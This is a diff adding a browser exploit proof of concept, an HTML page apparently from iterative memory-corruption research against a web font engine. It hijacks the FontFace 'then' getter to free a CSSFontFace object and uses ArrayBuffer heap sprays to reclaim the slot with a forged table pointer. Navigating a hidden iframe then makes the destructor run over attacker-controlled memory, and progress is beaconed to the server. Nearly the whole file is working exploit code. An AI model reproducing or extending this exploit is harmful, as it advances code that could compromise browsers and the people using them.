@@ -1,0 +1,280 @@
+<!--
+  p656d: forge inside iframe + document teardown = destructor hammer
+
+  Bench evidence so far (this console):
+    p656b: FORGE CONFIRMED — addClient used our forged m_table (+0x58=T1), rc=seed+1
+    p656c: fonts.clear() does NOT drop the pending ref (rc stayed 1)
+           -> the +1 ref is held by the load machinery (CSS-connected face
+              stuck in loading state), NOT by set membership
+    p655:  iframe navigation to about:blank releases ALL refs
+           (WeakRef dead <150ms) — deterministic teardown trigger
+
+  Synthesis: run the two-phase forge INSIDE a hidden iframe, spray from
+  parent (cross-doc reclaim proven in p655), then navigate the iframe.
+  Document teardown releases the leaked +1 -> rc 0 -> ~CSSFontFace runs
+  over OUR forged fields. Parent watches both dv1 and dv2 for:
+    CHANGED  — destructor writes / allocator freelist metadata
+    FREED    — fresh 192B marker (0xF7EE0657) re-took the slot
+    STABLE   — nothing (unexpected)
+
+  CRASH_CLASS: HIGH
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p656d</title></head>
+<body>p656d: forge + iframe teardown
+<pre id="log" style="color:#0f0;background:#000;font:12px monospace;padding:8px;white-space:pre-wrap"></pre>
+<script>
+(function() {
+'use strict';
+var L = document.getElementById('log');
+var bQ = [];
+
+function emit(tag, msg) {
+  var s = tag + (msg ? ' ' + msg : '');
+  L.textContent += s + '\n';
+  bQ.push(s);
+  if (bQ.length >= 2) flush();
+}
+function flush() {
+  if (!bQ.length) return;
+  var b = bQ.splice(0, 4).join('|');
+  try { var x = new XMLHttpRequest(); x.open('GET', '/beacon/P656D-' + encodeURIComponent(b), false); x.send(); } catch(e) {}
+}
+window.onerror = function(m) { emit('ERR', String(m).slice(0,120)); flush(); };
+
+function hex32(v) { return ('00000000' + (v >>> 0).toString(16)).slice(-8); }
+
+emit('START', 'forge-teardown');
+flush();
+
+// --- Parent state ---
+var bufs1 = [], bufs2 = [];
+var T1_lo = 0, T1_hi = 0;
+var state = { hit1: -1, hit2: -1, ready: false };
+
+window.parentSpray1 = function() {
+  for (var i = 0; i < 80; i++) {
+    var ab = new ArrayBuffer(192);
+    var dv = new DataView(ab);
+    dv.setUint32(0x00, 2, true);
+    dv.setUint32(0x04, 0xAAAA0001, true);
+    bufs1.push({ dv: dv });
+  }
+};
+window.parentSpray2 = function(tlo, thi) {
+  for (var i = 0; i < 80; i++) {
+    var ab = new ArrayBuffer(192);
+    var dv = new DataView(ab);
+    dv.setUint32(0x00, 0, true);        // seed rc=0 -> 1 after addClient
+    dv.setUint32(0x04, 0xCCCC0004, true);
+    dv.setUint32(0x58, tlo, true);      // FORGE m_table = T1
+    dv.setUint32(0x5C, thi, true);
+    bufs2.push({ dv: dv });
+  }
+};
+window.emitChild = function(tag, msg) { emit(tag, msg); };
+
+// --- Hidden iframe running the forge ---
+var ifr = document.createElement('iframe');
+ifr.style.display = 'none';
+document.body.appendChild(ifr);
+
+var iDoc = ifr.contentDocument;
+iDoc.open();
+iDoc.write([
+  '<!DOCTYPE html><html><head></head><body>',
+  '<script>',
+  '(function() {',
+  '  function p(tag, msg) { try { parent.emitChild(tag, msg); } catch(e) {} }',
+  '  var phase = 0;',
+  '  var sty1 = document.createElement("style");',
+  '  sty1.textContent = "@font-face { font-family: sa; src: local(Arial); unicode-range: U+0042; }";',
+  '  document.head.appendChild(sty1);',
+  '',
+  '  var ffA = new FontFace("fa", "local(Helvetica)", { unicodeRange: "U+0041" });',
+  '  document.fonts.add(ffA);',
+  '  void ffA.loaded;',
+  '',
+  '  Object.defineProperty(FontFace.prototype, "then", {',
+  '    configurable: true,',
+  '    get: function() {',
+  '      if (phase === 1) {',
+  '        phase = 0;',
+  '        sty1.remove();',
+  '        try { document.fonts.delete(this); } catch(e) {}',
+  '        document.body.offsetHeight;',
+  '        try { parent.parentSpray1(); } catch(e) { p("SPRAY1-ERR", String(e).slice(0,60)); }',
+  '        p("TRAP1", "sprayed");',
+  '        return undefined;',
+  '      }',
+  '      if (phase === 2) {',
+  '        phase = 0;',
+  '        sty2.remove();',
+  '        try { document.fonts.delete(this); } catch(e) {}',
+  '        document.body.offsetHeight;',
+  '        try { parent.parentSpray2(window.__tlo | 0, window.__thi | 0); } catch(e) { p("SPRAY2-ERR", String(e).slice(0,60)); }',
+  '        p("TRAP2", "sprayed forge=T1");',
+  '        return undefined;',
+  '      }',
+  '      return undefined;',
+  '    },',
+  '    set: function() {}',
+  '  });',
+  '',
+  '  phase = 1;',
+  '  document.fonts.load("1em fa, sa", "AB");',
+  '',
+  '  setTimeout(function() {',
+  '    var bufs1 = parent.bufs1;',
+  '    var hit1 = -1;',
+  '    for (var i = 0; i < bufs1.length; i++) {',
+  '      if (bufs1[i].dv.getUint32(0, true) !== 2) { hit1 = i; break; }',
+  '    }',
+  '    if (hit1 < 0) {',
+  '      for (var i = 0; i < bufs1.length; i++) {',
+  '        if (bufs1[i].dv.getUint32(0x58, true) !== 0 || bufs1[i].dv.getUint32(0x5C, true) !== 0) { hit1 = i; break; }',
+  '      }',
+  '    }',
+  '    if (hit1 < 0) { p("P1-MISS", "no reclaim"); return; }',
+  '    var dv1 = bufs1[hit1].dv;',
+  '    window.__tlo = dv1.getUint32(0x58, true);',
+  '    window.__thi = dv1.getUint32(0x5C, true);',
+  '    p("P1-HIT", "hit=" + hit1 + " T=0x" + window.__thi.toString(16) + window.__tlo.toString(16));',
+  '    if (window.__tlo === 0 && window.__thi === 0) { p("P1-FAIL", "T null"); return; }',
+  '',
+  '    var sty2 = document.createElement("style");',
+  '    sty2.textContent = "@font-face { font-family: sb; src: local(Arial); unicode-range: U+0043; }";',
+  '    document.head.appendChild(sty2);',
+  '    window.sty2 = sty2;',
+  '    var ffB = new FontFace("fb", "local(Helvetica)", { unicodeRange: "U+0044" });',
+  '    document.fonts.add(ffB);',
+  '    void ffB.loaded;',
+  '    phase = 2;',
+  '    document.fonts.load("1em fb, sb", "CD");',
+  '',
+  '    setTimeout(function() {',
+  '      var bufs2 = parent.bufs2;',
+  '      var hit2 = -1;',
+  '      for (var i = 0; i < bufs2.length; i++) {',
+  '        if (bufs2[i].dv.getUint32(0, true) !== 0) { hit2 = i; break; }',
+  '      }',
+  '      if (hit2 < 0) {',
+  '        for (var i = 0; i < bufs2.length; i++) {',
+  '          if (bufs2[i].dv.getUint32(0x68, true) !== 0 || bufs2[i].dv.getUint32(0x6C, true) !== 0) { hit2 = i; break; }',
+  '        }',
+  '      }',
+  '      if (hit2 < 0) { p("P2-MISS", "no reclaim"); return; }',
+  '      var dv2 = bufs2[hit2].dv;',
+  '      var rc = dv2.getUint32(0, true);',
+  '      var held = (dv2.getUint32(0x58, true) === (window.__tlo|0) && dv2.getUint32(0x5C, true) === (window.__thi|0));',
+  '      p("P2-HIT", "hit=" + hit2 + " rc=" + rc + " forge=" + held);',
+  '      try { parent.state.hit1 = hit1; parent.state.hit2 = hit2; parent.state.ready = true; } catch(e) {}',
+  '      p("READY", "parent should navigate now");',
+  '    }, 150);',
+  '  }, 100);',
+  '})();',
+  '<\/script></body></html>'
+].join('\n'));
+iDoc.close();
+
+emit('IFRAME', 'created');
+flush();
+
+// --- Parent teardown driver ---
+var waited = 0;
+function waitReady() {
+  if (!state.ready) {
+    waited += 200;
+    if (waited > 8000) { emit('TIMEOUT', 'forge never became ready'); flush(); return; }
+    setTimeout(waitReady, 200);
+    return;
+  }
+  var dv1 = bufs1[state.hit1].dv;
+  var dv2 = bufs2[state.hit2].dv;
+
+  var snap1 = [], snap2 = [];
+  for (var j = 0; j < 192; j += 4) { snap1.push(dv1.getUint32(j, true)); snap2.push(dv2.getUint32(j, true)); }
+
+  emit('PRE-NAV', 'rc1=' + dv1.getUint32(0, true) + ' rc2=' + dv2.getUint32(0, true));
+  flush();
+
+  // Navigate — destroys the iframe Document, releases every ref
+  try {
+    ifr.contentWindow.location.replace('about:blank');
+    emit('NAV', 'sent');
+  } catch(e) { emit('NAV-ERR', String(e).slice(0,60)); }
+  flush();
+
+  setTimeout(function() {
+    try { ifr.remove(); } catch(e) {}
+    ifr = null; iDoc = null;
+
+    var fresh = [];
+    var pollN = 0;
+    var maxPolls = 40;
+    var seen1 = { changed: false, freed: false };
+    var seen2 = { changed: false, freed: false };
+
+    function poll() {
+      pollN++;
+      for (var k = 0; k < 8; k++) {
+        var ab = new ArrayBuffer(192);
+        var dvf = new DataView(ab);
+        dvf.setUint32(0x04, 0xF7EE0658, true);
+        fresh.push(dvf);
+      }
+
+      function check(dv, snap, label, seen) {
+        var rc = dv.getUint32(0, true);
+        var mk = dv.getUint32(4, true);
+        var changed = [];
+        for (var j = 0; j < 192; j += 4) {
+          var cur = dv.getUint32(j, true);
+          if (cur !== snap[j / 4]) {
+            changed.push('+' + j.toString(16) + ':' + hex32(snap[j/4]) + '>' + hex32(cur));
+            snap[j / 4] = cur;
+          }
+        }
+        if (mk === 0xF7EE0658 && !seen.freed) {
+          seen.freed = true;
+          emit(label + '-FREED', 'slot re-taken by fresh spray');
+        } else if (changed.length && !seen.changed) {
+          seen.changed = true;
+          emit(label + '-CHANGED', 'rc=' + rc + ' diffs=' + changed.length);
+          emit(label + '-DIFFS', changed.slice(0, 12).join(' '));
+          var full = [];
+          for (var j = 0; j < 192; j += 8) {
+            full.push('+' + j.toString(16) + '=' + hex32(dv.getUint32(j+4, true)) + hex32(dv.getUint32(j, true)));
+          }
+          emit(label + '-FULL', full.join(' '));
+        }
+      }
+
+      check(dv1, snap1, 'D1', seen1);
+      check(dv2, snap2, 'D2', seen2);
+
+      if (pollN === 1 || pollN === 3 || pollN === 10 || pollN === 20) {
+        emit('POLL', 'n=' + pollN +
+          ' d1(rc=' + dv1.getUint32(0,true) + ',mk=0x' + hex32(dv1.getUint32(4,true)) + ')' +
+          ' d2(rc=' + dv2.getUint32(0,true) + ',mk=0x' + hex32(dv2.getUint32(4,true)) + ')');
+        flush();
+      }
+
+      if (pollN < maxPolls) {
+        setTimeout(poll, 100);
+      } else {
+        emit('VERDICT',
+          'D1 ' + (seen1.freed ? 'FREED' : seen1.changed ? 'DESTROYED' : 'STABLE') +
+          ' | D2 ' + (seen2.freed ? 'FREED' : seen2.changed ? 'DESTROYED' : 'STABLE'));
+        emit('ALIVE', 'end');
+        flush();
+      }
+    }
+
+    setTimeout(poll, 80);
+  }, 600);
+}
+setTimeout(waitReady, 120);
+
+})();
+</script>
+</body></html>
